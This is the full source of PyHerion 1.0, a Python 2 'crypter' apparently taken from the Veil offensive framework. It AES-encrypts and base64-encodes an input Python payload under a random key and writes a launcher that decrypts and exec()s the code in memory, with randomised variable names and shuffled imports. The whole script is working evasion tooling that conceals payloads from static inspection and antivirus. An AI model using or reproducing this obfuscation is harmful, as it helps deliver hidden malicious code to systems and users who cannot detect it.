#!/usr/bin/python

"""
PyHerion 1.0
By: @harmj0y


Python 'crypter' that builds an dynamic AES/base64 encoded launcher
(with a random key) that's decoded/decrypted in memory and then executed.


Standalone version of the same functionality integrated into Veil,
in ./modules/common/encryption.py

"""

from Crypto.Cipher import AES
import base64, random, string, sys

# crypto config stuff
BLOCK_SIZE = 32
PADDING = '{'

# used for separting out the import lines
imports = list()
output = list()

# check to make sure it's being called properly
if len(sys.argv) < 2 or len(sys.argv) > 3:
    print "\nPyherion 1.0\n\n\tusage:\t./pyherion.py intputfile [outputfile]\n"
    sys.exit()

# returns a random string/key of "bytes" length
def randKey(bytes):
    return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

# random 3 letter variable generator
def randVar():
    return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING

# one-liner to encrypt a code block then base64 it
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# generate our key and initialization vector
key = randKey(32)
iv = randKey(16)

input = open(sys.argv[1]).readlines()
pieces = sys.argv[1].split(".")

# build our new filename, "payload.py" -> "payload_crypted.py"
outputName = ".".join(pieces[:-2]) + pieces[-2] + "_crypted." + pieces[-1]

# check if the output name was specified, otherwise use the one built above
if len(sys.argv) == 3:
    outputName = sys.argv[2]

f = open(outputName, 'w')

# Detect if the passed argument is a python file
if pieces[-1] == "py":
    # separate imports from code- this is because pyinstaller needs to
    # know what imports to package with the .exe at compile time.
    # Otherwise the imports in the exec() string won't work
    for line in input:
        if not line.startswith("#"): # ignore commented imports...
            if "import" in line:
                imports.append(line.strip())
            else:
                output.append(line)

    # build our AES cipher
    cipherEnc = AES.new(key)

    # encrypt the input file (less the imports)
    encrypted = EncodeAES(cipherEnc, "".join(output))

    b64var = randVar()
    aesvar = randVar()

    # randomize our base64 and AES importing variable
    imports.append("from base64 import b64decode as %s" %(b64var))
    imports.append("from Crypto.Cipher import AES as %s" %(aesvar))

    # shuffle up our imports
    random.shuffle(imports)
    f.write(";".join(imports) + "\n")

    # build the exec() launcher
    f.write("exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted))))
    f.close()

else:
    print "\nonly python files can be used as input files"
    sys.exit()

print "\n\tCrypted output written to %s\n" % (outputName)
